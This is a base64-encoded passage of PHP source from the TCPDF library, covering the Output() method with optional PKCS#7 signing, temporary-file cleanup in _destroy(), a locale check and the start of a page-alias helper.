GUgd2l0aCB0aGUgbmFtZSBnaXZlbiBieSBuYW1lLjwvbGk+PGxpPlM6IHJldHVybiB0aGUgZG9jdW1lbnQgYXMgYSBzdHJpbmcgKG5hbWUgaXMgaWdub3JlZCkuPC9saT48bGk+Rkk6IGVxdWl2YWxlbnQgdG8gRiArIEkgb3B0aW9uPC9saT48bGk+RkQ6IGVxdWl2YWxlbnQgdG8gRiArIEQgb3B0aW9uPC9saT48bGk+RTogcmV0dXJuIHRoZSBkb2N1bWVudCBhcyBiYXNlNjQgbWltZSBtdWx0aS1wYXJ0IGVtYWlsIGF0dGFjaG1lbnQgKFJGQyAyMDQ1KTwvbGk+PC91bD4KCSAqIEByZXR1cm4gc3RyaW5nCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4wCgkgKiBAc2VlIENsb3NlKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIE91dHB1dCgkbmFtZT0nZG9jLnBkZicsICRkZXN0PSdJJykgewoJCS8vT3V0cHV0IFBERiB0byBzb21lIGRlc3RpbmF0aW9uCgkJLy9GaW5pc2ggZG9jdW1lbnQgaWYgbmVjZXNzYXJ5CgkJaWYgKCR0aGlzLT5zdGF0ZSA8IDMpIHsKCQkJJHRoaXMtPkNsb3NlKCk7CgkJfQoJCS8vTm9ybWFsaXplIHBhcmFtZXRlcnMKCQlpZiAoaXNfYm9vbCgkZGVzdCkpIHsKCQkJJGRlc3QgPSAkZGVzdCA/ICdEJyA6ICdGJzsKCQl9CgkJJGRlc3QgPSBzdHJ0b3VwcGVyKCRkZXN0KTsKCgkJaWYgKCR0aGlzLT5zaWduKSB7CgkJCS8vICoqKiBhcHBseSBkaWdpdGFsIHNpZ25hdHVyZSB0byB0aGUgZG9jdW1lbnQgKioqCgkJCS8vIGdldCB0aGUgZG9jdW1lbnQgY29udGVudAoJCQkkcGRmZG9jID0gJHRoaXMtPmdldEJ1ZmZlcigpOwoJCQkvLyByZW1vdmUgbGFzdCBuZXdsaW5lCgkJCSRwZGZkb2MgPSBzdWJzdHIoJHBkZmRvYywgMCwgLTEpOwoJCQkvLyByZW1vdmUgZmlsbGVyIHNwYWNlCgkJCSRieXRlcmFuZ2Vfc3RyaW5nX2xlbiA9IHN0cmxlbihUQ1BERl9TVEFUSUM6OiRieXRlcmFuZ2Vfc3RyaW5nKTsKCQkJLy8gZGVmaW5lIHRoZSBCeXRlUmFuZ2UKCQkJJGJ5dGVfcmFuZ2UgPSBhcnJheSgpOwoJCQkkYnl0ZV9yYW5nZVswXSA9IDA7CgkJCSRieXRlX3JhbmdlWzFdID0gc3RycG9zKCRwZGZkb2MsIFRDUERGX1NUQVRJQzo6JGJ5dGVyYW5nZV9zdHJpbmcpICsgJGJ5dGVyYW5nZV9zdHJpbmdfbGVuICsgMTA7CgkJCSRieXRlX3JhbmdlWzJdID0gJGJ5dGVfcmFuZ2VbMV0gKyAkdGhpcy0+c2lnbmF0dXJlX21heF9sZW5ndGggKyAyOwoJCQkkYnl0ZV9yYW5nZVszXSA9IHN0cmxlbigkcGRmZG9jKSAtICRieXRlX3JhbmdlWzJdOwoJCQkkcGRmZG9jID0gc3Vic3RyKCRwZGZkb2MsIDAsICRieXRlX3JhbmdlWzFdKS5zdWJzdHIoJHBkZmRvYywgJGJ5dGVfcmFuZ2VbMl0pOwoJCQkvLyByZXBsYWNlIHRoZSBCeXRlUmFuZ2UKCQkJJGJ5dGVyYW5nZSA9IHNwcmludGYoJy9CeXRlUmFuZ2VbMCAldSAldSAldV0nLCAkYnl0ZV9yYW5nZVsxXSwgJGJ5dGVfcmFuZ2VbMl0sICRieXRlX3JhbmdlWzNdKTsKCQkJJGJ5dGVyYW5nZSAuPSBzdHJfcmVwZWF0KCcgJywgKCRieXRlcmFuZ2Vfc3RyaW5nX2xlbiAtIHN0cmxlbigkYnl0ZXJhbmdlKSkpOwoJCQkkcGRmZG9jID0gc3RyX3JlcGxhY2UoVENQREZfU1RBVElDOjokYnl0ZXJhbmdlX3N0cmluZywgJGJ5dGVyYW5nZSwgJHBkZmRvYyk7CgkJCS8vIHdyaXRlIHRoZSBkb2N1bWVudCB0byBhIHRlbXBvcmFyeSBmb2xkZXIKCQkJJHRlbXBkb2MgPSBUQ1BERl9TVEFUSUM6OmdldE9iakZpbGVuYW1lKCdkb2MnLCAkdGhpcy0+ZmlsZV9pZCk7CgkJCSRmID0gVENQREZfU1RBVElDOjpmb3BlbkxvY2FsKCR0ZW1wZG9jLCAnd2InKTsKCQkJaWYgKCEkZikgewoJCQkJJHRoaXMtPkVycm9yKCdVbmFibGUgdG8gY3JlYXRlIHRlbXBvcmFyeSBmaWxlOiAnLiR0ZW1wZG9jKTsKCQkJfQoJCQkkcGRmZG9jX2xlbmd0aCA9IHN0cmxlbigkcGRmZG9jKTsKCQkJZndyaXRlKCRmLCAkcGRmZG9jLCAkcGRmZG9jX2xlbmd0aCk7CgkJCWZjbG9zZSgkZik7CgkJCS8vIGdldCBkaWdpdGFsIHNpZ25hdHVyZSB2aWEgb3BlbnNzbCBsaWJyYXJ5CgkJCSR0ZW1wc2lnbiA9IFRDUERGX1NUQVRJQzo6Z2V0T2JqRmlsZW5hbWUoJ3NpZycsICR0aGlzLT5maWxlX2lkKTsKCQkJaWYgKGVtcHR5KCR0aGlzLT5zaWduYXR1cmVfZGF0YVsnZXh0cmFjZXJ0cyddKSkgewoJCQkJb3BlbnNzbF9wa2NzN19zaWduKCR0ZW1wZG9jLCAkdGVtcHNpZ24sICR0aGlzLT5zaWduYXR1cmVfZGF0YVsnc2lnbmNlcnQnXSwgYXJyYXkoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydwcml2a2V5J10sICR0aGlzLT5zaWduYXR1cmVfZGF0YVsncGFzc3dvcmQnXSksIGFycmF5KCksIFBLQ1M3X0JJTkFSWSB8IFBLQ1M3X0RFVEFDSEVEKTsKCQkJfSBlbHNlIHsKCQkJCW9wZW5zc2xfcGtjczdfc2lnbigkdGVtcGRvYywgJHRlbXBzaWduLCAkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ3NpZ25jZXJ0J10sIGFycmF5KCR0aGlzLT5zaWduYXR1cmVfZGF0YVsncHJpdmtleSddLCAkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ3Bhc3N3b3JkJ10pLCBhcnJheSgpLCBQS0NTN19CSU5BUlkgfCBQS0NTN19ERVRBQ0hFRCwgJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydleHRyYWNlcnRzJ10pOwoJCQl9CgkJCS8vIHJlYWQgc2lnbmF0dXJlCgkJCSRzaWduYXR1cmUgPSBmaWxlX2dldF9jb250ZW50cygkdGVtcHNpZ24pOwoJCQkvLyBleHRyYWN0IHNpZ25hdHVyZQoJCQkkc2lnbmF0dXJlID0gc3Vic3RyKCRzaWduYXR1cmUsICRwZGZkb2NfbGVuZ3RoKTsKCQkJJHNpZ25hdHVyZSA9IHN1YnN0cigkc2lnbmF0dXJlLCAoc3RycG9zKCRzaWduYXR1cmUsICIlJUVPRlxuXG4tLS0tLS0iKSArIDEzKSk7CgkJCSR0bXBhcnIgPSBleHBsb2RlKCJcblxuIiwgJHNpZ25hdHVyZSk7CgkJCSRzaWduYXR1cmUgPSAkdG1wYXJyWzFdOwoJCQkvLyBkZWNvZGUgc2lnbmF0dXJlCgkJCSRzaWduYXR1cmUgPSBiYXNlNjRfZGVjb2RlKHRyaW0oJHNpZ25hdHVyZSkpOwoJCQkvLyBhZGQgVFNBIHRpbWVzdGFtcCB0byBzaWduYXR1cmUKCQkJJHNpZ25hdHVyZSA9ICR0aGlzLT5hcHBseVRTQSgkc2lnbmF0dXJlKTsKCQkJLy8gY29udmVydCBzaWduYXR1cmUgdG8gaGV4CgkJCSRzaWduYXR1cmUgPSBjdXJyZW50KHVucGFjaygnSConLCAkc2lnbmF0dXJlKSk7CgkJCSRzaWduYXR1cmUgPSBzdHJfcGFkKCRzaWduYXR1cmUsICR0aGlzLT5zaWduYXR1cmVfbWF4X2xlbmd0aCwgJzAnKTsKCQkJLy8gQWRkIHNpZ25hdHVyZSB0byB0aGUgZG9jdW1lbnQKCQkJJHRoaXMtPmJ1ZmZlciA9IHN1YnN0cigkcGRmZG9jLCAwLCAkYnl0ZV9yYW5nZVsxXSkuJzwnLiRzaWduYXR1cmUuJz4nLnN1YnN0cigkcGRmZG9jLCAkYnl0ZV9yYW5nZVsxXSk7CgkJCSR0aGlzLT5idWZmZXJsZW4gPSBzdHJsZW4oJHRoaXMtPmJ1ZmZlcik7CgkJfQoJCXN3aXRjaCgkZGVzdCkgewoJCQljYXNlICdJJzogewoJCQkJLy8gU2VuZCBQREYgdG8gdGhlIHN0YW5kYXJkIG91dHB1dAoJCQkJaWYgKG9iX2dldF9jb250ZW50cygpKSB7CgkJCQkJJHRoaXMtPkVycm9yKCdTb21lIGRhdGEgaGFzIGFscmVhZHkgYmVlbiBvdXRwdXQsIGNhblwndCBzZW5kIFBERiBmaWxlJyk7CgkJCQl9CgkJCQlpZiAocGhwX3NhcGlfbmFtZSgpICE9ICdjbGknKSB7CgkJCQkJLy8gc2VuZCBvdXRwdXQgdG8gYSBicm93c2VyCgkJCQkJaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3BkZicpOwoJCQkJCWlmIChoZWFkZXJzX3NlbnQoKSkgewoJCQkJCQkkdGhpcy0+RXJyb3IoJ1NvbWUgZGF0YSBoYXMgYWxyZWFkeSBiZWVuIG91dHB1dCB0byBicm93c2VyLCBjYW5cJ3Qgc2VuZCBQREYgZmlsZScpOwoJCQkJCX0KCQkJCQloZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IHByaXZhdGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCwgbWF4LWFnZT0xJyk7CgkJCQkJLy9oZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IHB1YmxpYywgbXVzdC1yZXZhbGlkYXRlLCBtYXgtYWdlPTAnKTsgLy8gSFRUUC8xLjEKCQkJCQloZWFkZXIoJ1ByYWdtYTogcHVibGljJyk7CgkJCQkJaGVhZGVyKCdFeHBpcmVzOiBTYXQsIDI2IEp1bCAxOTk3IDA1OjAwOjAwIEdNVCcpOyAvLyBEYXRlIGluIHRoZSBwYXN0CgkJCQkJaGVhZGVyKCdMYXN0LU1vZGlmaWVkOiAnLmdtZGF0ZSgnRCwgZCBNIFkgSDppOnMnKS4nIEdNVCcpOwoJCQkJCWhlYWRlcignQ29udGVudC1EaXNwb3NpdGlvbjogaW5saW5lOyBmaWxlbmFtZT0iJyAuIHJhd3VybGVuY29kZShiYXNlbmFtZSgkbmFtZSkpIC4gJyI7ICcgLgoJCQkJCQknZmlsZW5hbWUqPVVURi04XCdcJycgLiByYXd1cmxlbmNvZGUoYmFzZW5hbWUoJG5hbWUpKSk7CgkJCQkJVENQREZfU1RBVElDOjpzZW5kT3V0cHV0RGF0YSgkdGhpcy0+Z2V0QnVmZmVyKCksICR0aGlzLT5idWZmZXJsZW4pOwoJCQkJfSBlbHNlIHsKCQkJCQllY2hvICR0aGlzLT5nZXRCdWZmZXIoKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ0QnOiB7CgkJCQkvLyBkb3dubG9hZCBQREYgYXMgZmlsZQoJCQkJaWYgKG9iX2dldF9jb250ZW50cygpKSB7CgkJCQkJJHRoaXMtPkVycm9yKCdTb21lIGRhdGEgaGFzIGFscmVhZHkgYmVlbiBvdXRwdXQsIGNhblwndCBzZW5kIFBERiBmaWxlJyk7CgkJCQl9CgkJCQloZWFkZXIoJ0NvbnRlbnQtRGVzY3JpcHRpb246IEZpbGUgVHJhbnNmZXInKTsKCQkJCWlmIChoZWFkZXJzX3NlbnQoKSkgewoJCQkJCSR0aGlzLT5FcnJvcignU29tZSBkYXRhIGhhcyBhbHJlYWR5IGJlZW4gb3V0cHV0IHRvIGJyb3dzZXIsIGNhblwndCBzZW5kIFBERiBmaWxlJyk7CgkJCQl9CgkJCQloZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IHByaXZhdGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCwgbWF4LWFnZT0xJyk7CgkJCQkvL2hlYWRlcignQ2FjaGUtQ29udHJvbDogcHVibGljLCBtdXN0LXJldmFsaWRhdGUsIG1heC1hZ2U9MCcpOyAvLyBIVFRQLzEuMQoJCQkJaGVhZGVyKCdQcmFnbWE6IHB1YmxpYycpOwoJCQkJaGVhZGVyKCdFeHBpcmVzOiBTYXQsIDI2IEp1bCAxOTk3IDA1OjAwOjAwIEdNVCcpOyAvLyBEYXRlIGluIHRoZSBwYXN0CgkJCQloZWFkZXIoJ0xhc3QtTW9kaWZpZWQ6ICcuZ21kYXRlKCdELCBkIE0gWSBIOmk6cycpLicgR01UJyk7CgkJCQkvLyBmb3JjZSBkb3dubG9hZCBkaWFsb2cKCQkJCWlmIChzdHJwb3MocGhwX3NhcGlfbmFtZSgpLCAnY2dpJykgPT09IGZhbHNlKSB7CgkJCQkJaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2ZvcmNlLWRvd25sb2FkJyk7CgkJCQkJaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsIGZhbHNlKTsKCQkJCQloZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vZG93bmxvYWQnLCBmYWxzZSk7CgkJCQkJaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3BkZicsIGZhbHNlKTsKCQkJCX0gZWxzZSB7CgkJCQkJaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3BkZicpOwoJCQkJfQoJCQkJLy8gdXNlIHRoZSBDb250ZW50LURpc3Bvc2l0aW9uIGhlYWRlciB0byBzdXBwbHkgYSByZWNvbW1lbmRlZCBmaWxlbmFtZQoJCQkJaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0iJyAuIHJhd3VybGVuY29kZShiYXNlbmFtZSgkbmFtZSkpIC4gJyI7ICcgLgoJCQkJCSdmaWxlbmFtZSo9VVRGLThcJ1wnJyAuIHJhd3VybGVuY29kZShiYXNlbmFtZSgkbmFtZSkpKTsKCQkJCWhlYWRlcignQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5Jyk7CgkJCQlUQ1BERl9TVEFUSUM6OnNlbmRPdXRwdXREYXRhKCR0aGlzLT5nZXRCdWZmZXIoKSwgJHRoaXMtPmJ1ZmZlcmxlbik7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdGJzoKCQkJY2FzZSAnRkknOgoJCQljYXNlICdGRCc6IHsKCQkJCS8vIHNhdmUgUERGIHRvIGEgbG9jYWwgZmlsZQoJCQkJJGYgPSBUQ1BERl9TVEFUSUM6OmZvcGVuTG9jYWwoJG5hbWUsICd3YicpOwoJCQkJaWYgKCEkZikgewoJCQkJCSR0aGlzLT5FcnJvcignVW5hYmxlIHRvIGNyZWF0ZSBvdXRwdXQgZmlsZTogJy4kbmFtZSk7CgkJCQl9CgkJCQlmd3JpdGUoJGYsICR0aGlzLT5nZXRCdWZmZXIoKSwgJHRoaXMtPmJ1ZmZlcmxlbik7CgkJCQlmY2xvc2UoJGYpOwoJCQkJaWYgKCRkZXN0ID09ICdGSScpIHsKCQkJCQkvLyBzZW5kIGhlYWRlcnMgdG8gYnJvd3NlcgoJCQkJCWhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9wZGYnKTsKCQkJCQloZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IHByaXZhdGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCwgbWF4LWFnZT0xJyk7CgkJCQkJLy9oZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IHB1YmxpYywgbXVzdC1yZXZhbGlkYXRlLCBtYXgtYWdlPTAnKTsgLy8gSFRUUC8xLjEKCQkJCQloZWFkZXIoJ1ByYWdtYTogcHVibGljJyk7CgkJCQkJaGVhZGVyKCdFeHBpcmVzOiBTYXQsIDI2IEp1bCAxOTk3IDA1OjAwOjAwIEdNVCcpOyAvLyBEYXRlIGluIHRoZSBwYXN0CgkJCQkJaGVhZGVyKCdMYXN0LU1vZGlmaWVkOiAnLmdtZGF0ZSgnRCwgZCBNIFkgSDppOnMnKS4nIEdNVCcpOwoJCQkJCWhlYWRlcignQ29udGVudC1EaXNwb3NpdGlvbjogaW5saW5lOyBmaWxlbmFtZT0iJy5iYXNlbmFtZSgkbmFtZSkuJyInKTsKCQkJCQlUQ1BERl9TVEFUSUM6OnNlbmRPdXRwdXREYXRhKGZpbGVfZ2V0X2NvbnRlbnRzKCRuYW1lKSwgZmlsZXNpemUoJG5hbWUpKTsKCQkJCX0gZWxzZWlmICgkZGVzdCA9PSAnRkQnKSB7CgkJCQkJLy8gc2VuZCBoZWFkZXJzIHRvIGJyb3dzZXIKCQkJCQlpZiAob2JfZ2V0X2NvbnRlbnRzKCkpIHsKCQkJCQkJJHRoaXMtPkVycm9yKCdTb21lIGRhdGEgaGFzIGFscmVhZHkgYmVlbiBvdXRwdXQsIGNhblwndCBzZW5kIFBERiBmaWxlJyk7CgkJCQkJfQoJCQkJCWhlYWRlcignQ29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2ZlcicpOwoJCQkJCWlmIChoZWFkZXJzX3NlbnQoKSkgewoJCQkJCQkkdGhpcy0+RXJyb3IoJ1NvbWUgZGF0YSBoYXMgYWxyZWFkeSBiZWVuIG91dHB1dCB0byBicm93c2VyLCBjYW5cJ3Qgc2VuZCBQREYgZmlsZScpOwoJCQkJCX0KCQkJCQloZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IHByaXZhdGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCwgbWF4LWFnZT0xJyk7CgkJCQkJaGVhZGVyKCdQcmFnbWE6IHB1YmxpYycpOwoJCQkJCWhlYWRlcignRXhwaXJlczogU2F0LCAyNiBKdWwgMTk5NyAwNTowMDowMCBHTVQnKTsgLy8gRGF0ZSBpbiB0aGUgcGFzdAoJCQkJCWhlYWRlcignTGFzdC1Nb2RpZmllZDogJy5nbWRhdGUoJ0QsIGQgTSBZIEg6aTpzJykuJyBHTVQnKTsKCQkJCQkvLyBmb3JjZSBkb3dubG9hZCBkaWFsb2cKCQkJCQlpZiAoc3RycG9zKHBocF9zYXBpX25hbWUoKSwgJ2NnaScpID09PSBmYWxzZSkgewoJCQkJCQloZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vZm9yY2UtZG93bmxvYWQnKTsKCQkJCQkJaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsIGZhbHNlKTsKCQkJCQkJaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2Rvd25sb2FkJywgZmFsc2UpOwoJCQkJCQloZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vcGRmJywgZmFsc2UpOwoJCQkJCX0gZWxzZSB7CgkJCQkJCWhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9wZGYnKTsKCQkJCQl9CgkJCQkJLy8gdXNlIHRoZSBDb250ZW50LURpc3Bvc2l0aW9uIGhlYWRlciB0byBzdXBwbHkgYSByZWNvbW1lbmRlZCBmaWxlbmFtZQoJCQkJCWhlYWRlcignQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9IicuYmFzZW5hbWUoJG5hbWUpLiciJyk7CgkJCQkJaGVhZGVyKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiBiaW5hcnknKTsKCQkJCQlUQ1BERl9TVEFUSUM6OnNlbmRPdXRwdXREYXRhKGZpbGVfZ2V0X2NvbnRlbnRzKCRuYW1lKSwgZmlsZXNpemUoJG5hbWUpKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ0UnOiB7CgkJCQkvLyByZXR1cm4gUERGIGFzIGJhc2U2NCBtaW1lIG11bHRpLXBhcnQgZW1haWwgYXR0YWNobWVudCAoUkZDIDIwNDUpCgkJCQkkcmV0dmFsID0gJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vcGRmOycuIlxyXG4iOwoJCQkJJHJldHZhbCAuPSAnIG5hbWU9IicuJG5hbWUuJyInLiJcclxuIjsKCQkJCSRyZXR2YWwgLj0gJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2Rpbmc6IGJhc2U2NCcuIlxyXG4iOwoJCQkJJHJldHZhbCAuPSAnQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsnLiJcclxuIjsKCQkJCSRyZXR2YWwgLj0gJyBmaWxlbmFtZT0iJy4kbmFtZS4nIicuIlxyXG5cclxuIjsKCQkJCSRyZXR2YWwgLj0gY2h1bmtfc3BsaXQoYmFzZTY0X2VuY29kZSgkdGhpcy0+Z2V0QnVmZmVyKCkpLCA3NiwgIlxyXG4iKTsKCQkJCXJldHVybiAkcmV0dmFsOwoJCQl9CgkJCWNhc2UgJ1MnOiB7CgkJCQkvLyByZXR1cm5zIFBERiBhcyBhIHN0cmluZwoJCQkJcmV0dXJuICR0aGlzLT5nZXRCdWZmZXIoKTsKCQkJfQoJCQlkZWZhdWx0OiB7CgkJCQkkdGhpcy0+RXJyb3IoJ0luY29ycmVjdCBvdXRwdXQgZGVzdGluYXRpb246ICcuJGRlc3QpOwoJCQl9CgkJfQoJCXJldHVybiAnJzsKCX0KCglwcm90ZWN0ZWQgc3RhdGljICRjbGVhbmVkX2lkcyA9IGFycmF5KCk7CgkvKioKCSAqIFVuc2V0IGFsbCBjbGFzcyB2YXJpYWJsZXMgZXhjZXB0IHRoZSBmb2xsb3dpbmcgY3JpdGljYWwgdmFyaWFibGVzLgoJICogQHBhcmFtIGJvb2xlYW4gJGRlc3Ryb3lhbGwgaWYgdHJ1ZSBkZXN0cm95cyBhbGwgY2xhc3MgdmFyaWFibGVzLCBvdGhlcndpc2UgcHJlc2VydmVzIGNyaXRpY2FsIHZhcmlhYmxlcy4KCSAqIEBwYXJhbSBib29sZWFuICRwcmVzZXJ2ZV9vYmpjb3B5IGlmIHRydWUgcHJlc2VydmVzIHRoZSBvYmpjb3B5IHZhcmlhYmxlCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC41LjAxNiAoMjAwOS0wMi0yNCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIF9kZXN0cm95KCRkZXN0cm95YWxsPWZhbHNlLCAkcHJlc2VydmVfb2JqY29weT1mYWxzZSkgewoJCWlmIChpc3NldChzZWxmOjokY2xlYW5lZF9pZHNbJHRoaXMtPmZpbGVfaWRdKSkgewoJCQkkZGVzdHJveWFsbCA9IGZhbHNlOwoJCX0KCQlpZiAoJGRlc3Ryb3lhbGwgQU5EICEkcHJlc2VydmVfb2JqY29weSAmJiBpc3NldCgkdGhpcy0+ZmlsZV9pZCkpIHsKCQkJc2VsZjo6JGNsZWFuZWRfaWRzWyR0aGlzLT5maWxlX2lkXSA9IHRydWU7CgkJCS8vIHJlbW92ZSBhbGwgdGVtcG9yYXJ5IGZpbGVzCgkJCWlmICgkaGFuZGxlID0gQG9wZW5kaXIoS19QQVRIX0NBQ0hFKSkgewoJCQkJd2hpbGUgKCBmYWxzZSAhPT0gKCAkZmlsZV9uYW1lID0gcmVhZGRpciggJGhhbmRsZSApICkgKSB7CgkJCQkJaWYgKHN0cnBvcygkZmlsZV9uYW1lLCAnX190Y3BkZl8nLiR0aGlzLT5maWxlX2lkLidfJykgPT09IDApIHsKCQkJCQkJJHRoaXMtPl91bmxpbmsoS19QQVRIX0NBQ0hFLiRmaWxlX25hbWUpOwoJCQkJCX0KCQkJCX0KCQkJCWNsb3NlZGlyKCRoYW5kbGUpOwoJCQl9CgkJCWlmIChpc3NldCgkdGhpcy0+aW1hZ2VrZXlzKSkgewoJCQkJZm9yZWFjaCgkdGhpcy0+aW1hZ2VrZXlzIGFzICRmaWxlKSB7CgkJCQkJaWYgKChzdHJwb3MoJGZpbGUsICBLX1BBVEhfQ0FDSEUuJ19fdGNwZGZfJy4kdGhpcy0+ZmlsZV9pZC4nXycpID09PSAwKQoJCQkJCQkmJiBUQ1BERl9TVEFUSUM6OmZpbGVfZXhpc3RzKCRmaWxlKSkgewoJCQkJCQkJJHRoaXMtPl91bmxpbmsoJGZpbGUpOwoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCQkkcHJlc2VydmUgPSBhcnJheSgKCQkJJ2ZpbGVfaWQnLAoJCQknc3RhdGUnLAoJCQknYnVmZmVybGVuJywKCQkJJ2J1ZmZlcicsCgkJCSdjYWNoZWRfZmlsZXMnLAoJCQknaW1hZ2VrZXlzJywKCQkJJ3NpZ24nLAoJCQknc2lnbmF0dXJlX2RhdGEnLAoJCQknc2lnbmF0dXJlX21heF9sZW5ndGgnLAoJCQknYnl0ZXJhbmdlX3N0cmluZycsCgkJCSd0c2FfdGltZXN0YW1wJywKCQkJJ3RzYV9kYXRhJwoJCSk7CgkJZm9yZWFjaCAoYXJyYXlfa2V5cyhnZXRfb2JqZWN0X3ZhcnMoJHRoaXMpKSBhcyAkdmFsKSB7CgkJCWlmICgkZGVzdHJveWFsbCBPUiAhaW5fYXJyYXkoJHZhbCwgJHByZXNlcnZlKSkgewoJCQkJaWYgKCghJHByZXNlcnZlX29iamNvcHkgT1IgKCR2YWwgIT0gJ29iamNvcHknKSkgQU5EICgkdmFsICE9ICdmaWxlX2lkJykgQU5EIGlzc2V0KCR0aGlzLT4kdmFsKSkgewoJCQkJCXVuc2V0KCR0aGlzLT4kdmFsKTsKCQkJCX0KCQkJfQoJCX0KCX0KCgkvKioKCSAqIENoZWNrIGZvciBsb2NhbGUtcmVsYXRlZCBidWcKCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9kb2NoZWNrcygpIHsKCQkvL0NoZWNrIGZvciBsb2NhbGUtcmVsYXRlZCBidWcKCQlpZiAoMS4xID09IDEpIHsKCQkJJHRoaXMtPkVycm9yKCdEb25cJ3QgYWx0ZXIgdGhlIGxvY2FsZSBiZWZvcmUgaW5jbHVkaW5nIGNsYXNzIGZpbGUnKTsKCQl9CgkJLy9DaGVjayBmb3IgZGVjaW1hbCBzZXBhcmF0b3IKCQlpZiAoc3ByaW50ZignJS4xRicsIDEuMCkgIT0gJzEuMCcpIHsKCQkJc2V0bG9jYWxlKExDX05VTUVSSUMsICdDJyk7CgkJfQoJfQoKCS8qKgoJICogUmV0dXJuIGFuIGFycmF5IGNvbnRhaW5pbmcgdmFyaWF0aW9ucyBmb3IgdGhlIGJhc2ljIHBhZ2UgbnVtYmVyIGFsaWFzLgoJICogQHBhcmFtIHN0cmluZyAkYSBCYXNlIGFsaWFzLgoJICogQHJldHVybiBhcnJheSBvZiBwYWdlIG51bWJlciBhbGlhc2VzCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBnZXRJbnRlcm5hbFBhZ2VOdW1iZXJBbGlhc2VzKCRhPSAnJykgewoJCSRhbGlhcyA9IGFycmF5KCk7CgkJLy8gYnVpbGQgYXJyYXkgb2YgVW5pY29kZSArIEFTQ0lJIHZhcmlhbnRzICh0aGUgb3JkZXIgaXMgaW1wb3J0YW50KQoJCSRhbGlhcyA9IGFycmF5KCd1JyA9PiBhcnJheSgpLCAnYScgPT4gYXJyYXkoKSk7CgkJJHUgPSAneycuJGEuJ30nOwoJCSRhbGlhc1sndSddW10gPSBUQ1BERl9TVEFUSUM6Ol9lc2NhcGUoJHUpOwoJCWlmICgkdGhpcy0+aXN1bmljb2RlKSB7CgkJCSRhbGlhc1sndSddW10gPSBUQ1BERl9TVEFUSUM6Ol9lc2NhcGUoVENQREZfRk9OVFM6OlVURjhUb0xhdGluMSgkdSwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KSk7CgkJCSRhbGlhc1sndSddW10gPSBUQ1BERl9TVEFUSUM6Ol9lc2NhcGUoVENQREZfRk9OVFM6OnV0ZjhTdHJSZXYoJHUsIGZhbHNlLCAkdGhpcy0+dG1wcnRsLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpKTsKCQkJJGFsaWFzWydhJ11bXSA9IFRDUERGX1NUQVRJQzo6X2VzY2FwZShUQ1BERl9GT05UUzo6VVRGOFRvTGF0aW4xKCRhLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpKTsKCQkJJGFsaWFzWydhJ11bXSA9IFRDUERGX1NUQVRJQzo6X2VzY2FwZShUQ1BERl9GT05UUzo6dXRmOFN0clJldigkYSwgZmFsc2UsICR0aGlzLT50bXBydGwsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCkpOwoJCX0KCQkkYWxpYXNbJ2EnXVtdID0gVENQREZfU1RBVElDOjpfZXNjYXBlKCRhKTsKCQlyZXR1cm4gJGFsaWFzOwoJfQoKCS8qKgoJICogUmV0dXJuIGFuIGFycmF5IGNvbnRhaW5pbmcgYWxsIGludGVybmFsIHB